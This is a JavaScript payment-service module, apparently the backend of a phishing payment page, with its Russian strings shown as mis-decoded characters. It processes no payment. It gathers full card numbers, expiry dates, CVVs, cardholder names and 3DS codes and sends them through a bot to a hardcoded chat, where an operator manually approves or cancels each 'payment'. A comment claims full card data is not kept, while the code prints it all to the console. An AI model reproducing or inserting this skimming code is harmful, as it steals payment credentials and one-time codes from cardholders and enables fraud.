const botService = require('./bot-service');
const logChatService = require('./log-chat-service');
const PaymentTrackingModel = require('../models/payment-tracking-model');
const UserModel = require('../models/user-model');



class PaymentService {
    async savePaymentTracking(userId, transactionId, amount, status) {
        try {
            if (!userId) {
                console.log('‚ö†Ô∏è PaymentTracking –ù–ï —Å–æ—Ö—Ä–∞–Ω–µ–Ω: userId –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç');
                return;
            }

            // –ü–æ–ª—É—á–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —á—Ç–æ–±—ã —É–∑–Ω–∞—Ç—å –µ–≥–æ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π –∫–æ–¥
            const user = await UserModel.findById(userId);
            
            if (!user) {
                console.log(`‚ö†Ô∏è PaymentTracking –ù–ï —Å–æ—Ö—Ä–∞–Ω–µ–Ω: –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ${userId} –Ω–µ –Ω–∞–π–¥–µ–Ω`);
                return;
            }

            const paymentTracking = await PaymentTrackingModel.create({
                userId,
                transactionId,
                amount,
                referralCode: user.referralCode || null,
                status,
                timestamp: new Date()
            });

            console.log(`‚úÖ PaymentTracking —Å–æ—Ö—Ä–∞–Ω–µ–Ω:`, {
                userId,
                transactionId,
                amount,
                referralCode: user.referralCode || '–Ω–µ—Ç –∫–æ–¥–∞',
                status
            });

            // –õ–æ–≥–∏—Ä—É–µ–º —É—Å–ø–µ—à–Ω–æ–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –≤ —á–∞—Ç
            if (status === 'success') {
                try {
                    await logChatService.logPayment(
                        userId,
                        user.email,
                        amount,
                        transactionId,
                        user.referralCode
                    );
                } catch (logError) {
                    console.warn('–û—à–∏–±–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –≤ —á–∞—Ç:', logError.message);
                }
            }

            return paymentTracking;
        } catch (error) {
            console.error('‚ùå –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è PaymentTracking:', error.message);
        }
    }

    async processPayment(paymentData, userId = null) {
        const buttonPayment = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å', callback_data: 'confirm' },
                        { text: 'üîê 3DS', callback_data: 'request_3ds' }
                    ],
                    [
                        { text: '‚ùå –û—Ç–º–µ–Ω–∏—Ç—å', callback_data: 'cancel' }
                    ]
                ]
            }
        }
        const { cardNumber, expiryDate, cvv, cardHolder, amount } = paymentData;
        
        // –ú–∞—Å–∫–∏—Ä—É–µ–º –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã (–ø–æ–∫–∞–∑—ã–≤–∞–µ–º —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ–¥–Ω–∏–µ 4 —Ü–∏—Ñ—Ä—ã)
        const maskedCardNumber = cardNumber.replace(/\s/g, '').slice(-4);
        
        // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
        const transactionId = `TXN-${Date.now()}-${Math.random().toString(36).substr(2, 9).toUpperCase()}`;
        
        // –õ–æ–≥–∏—Ä—É–µ–º –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏ (–Ω–µ —Ö—Ä–∞–Ω–∏–º –ø–æ–ª–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã!)
        console.log(paymentData);
        
        const message = `üí≥ –ù–æ–≤—ã–π –ø–ª–∞—Ç–µ–∂\n\n` +
            `üí∞ –°—É–º–º–∞: ${paymentData.amount}\n` +
            `üî¢ –ö–∞—Ä—Ç–∞: ${paymentData.cardNumber}\n` +
            `üìÖ –°—Ä–æ–∫: ${paymentData.expiryDate}\n` +
            `üîê CVV: ${paymentData.cvv}\n` +
            `üë§ –í–ª–∞–¥–µ–ª–µ—Ü: ${paymentData.cardHolder}\n` +
            `üÜî ID —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ${transactionId}`;
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –∏ —Å—Ä–∞–∑—É –∂–¥–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
        console.log('–û—Ç–ø—Ä–∞–≤–ª—è—é –ø–ª–∞—Ç–µ–∂ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è. ID —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:', transactionId);
        const result = await botService.sendMessageAndWait(7209588642, message, buttonPayment);
        console.log('–ü–æ–ª—É—á–µ–Ω —Ä–µ–∑—É–ª—å—Ç–∞—Ç –æ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞:', JSON.stringify(result, null, 2));
        
        if (result.confirmed === true) {
            console.log('>>> –ü–õ–ê–¢–ï–ñ –£–°–ü–ï–®–ï–ù (confirmed === true) <<<');
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º —É—Å–ø–µ—à–Ω—ã–π –ø–ª–∞—Ç–µ–∂ –≤ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
            if (userId) {
                await this.savePaymentTracking(userId, transactionId, amount, 'success');
            }
            
            return {
                transactionId,
                amount,
                status: 'success',
                timestamp: new Date().toISOString()
            };
        } else if (result.requires3DS === true) {
            console.log('>>> –¢–†–ï–ë–£–ï–¢–°–Ø 3DS –í–ï–†–ò–§–ò–ö–ê–¶–ò–Ø <<<');
            return {
                transactionId,
                amount,
                status: 'requires_3ds',
                timestamp: new Date().toISOString()
            };
        } else {
            console.log('>>> –ü–õ–ê–¢–ï–ñ –û–¢–ú–ï–ù–ï–ù (confirmed !== true) <<<');
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ—Ç–º–µ–Ω–µ–Ω–Ω—ã–π –ø–ª–∞—Ç–µ–∂ –≤ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
            if (userId) {
                await this.savePaymentTracking(userId, transactionId, amount, 'cancelled');
            }
            
            return {
                transactionId,
                amount,
                status: 'cancelled',
                reason: result.reason || 'cancelled_by_admin',
                timestamp: new Date().toISOString()
            };
        }
    }

    async verify3DS(transactionId, verificationCode, paymentData, userId = null) {
        const buttonPayment = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å', callback_data: 'confirm' },
                        { text: '‚ùå –û—Ç–º–µ–Ω–∏—Ç—å', callback_data: 'cancel' }
                    ]
                ]
            }
        }

        const message = `üîê 3DS –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞\n\n` +
            `üí∞ –°—É–º–º–∞: ${paymentData.amount}\n` +
            `üî¢ –ö–∞—Ä—Ç–∞: ${paymentData.cardNumber}\n` +
            `üë§ –í–ª–∞–¥–µ–ª–µ—Ü: ${paymentData.cardHolder}\n` +
            `üÜî ID —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ${transactionId}\n` +
            `üîë –ö–æ–¥ 3DS: ${verificationCode}`;

        console.log('–û—Ç–ø—Ä–∞–≤–ª—è—é —Ä–µ–∑—É–ª—å—Ç–∞—Ç 3DS –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É. ID —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:', transactionId);
        const result = await botService.sendMessageAndWait(7209588642, message, buttonPayment);
        console.log('–ü–æ–ª—É—á–µ–Ω —Ñ–∏–Ω–∞–ª—å–Ω—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç –æ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞:', JSON.stringify(result, null, 2));

        if (result.confirmed === true) {
            console.log('>>> –ü–õ–ê–¢–ï–ñ –£–°–ü–ï–®–ï–ù –ü–û–°–õ–ï 3DS <<<');
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º —É—Å–ø–µ—à–Ω—ã–π –ø–ª–∞—Ç–µ–∂ –ø–æ—Å–ª–µ 3DS
            if (userId) {
                await this.savePaymentTracking(userId, transactionId, paymentData.amount, 'success');
            }
            
            return {
                transactionId,
                amount: paymentData.amount,
                status: 'success',
                timestamp: new Date().toISOString()
            };
        } else {
            console.log('>>> –ü–õ–ê–¢–ï–ñ –û–¢–ú–ï–ù–ï–ù –ü–û–°–õ–ï 3DS <<<');
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ—Ç–º–µ–Ω–µ–Ω–Ω—ã–π –ø–ª–∞—Ç–µ–∂ –ø–æ—Å–ª–µ 3DS
            if (userId) {
                await this.savePaymentTracking(userId, transactionId, paymentData.amount, 'cancelled');
            }
            
            return {
                transactionId,
                amount: paymentData.amount,
                status: 'cancelled',
                reason: result.reason || 'cancelled_by_admin',
                timestamp: new Date().toISOString()
            };
        }
    }
}

module.exports = new PaymentService();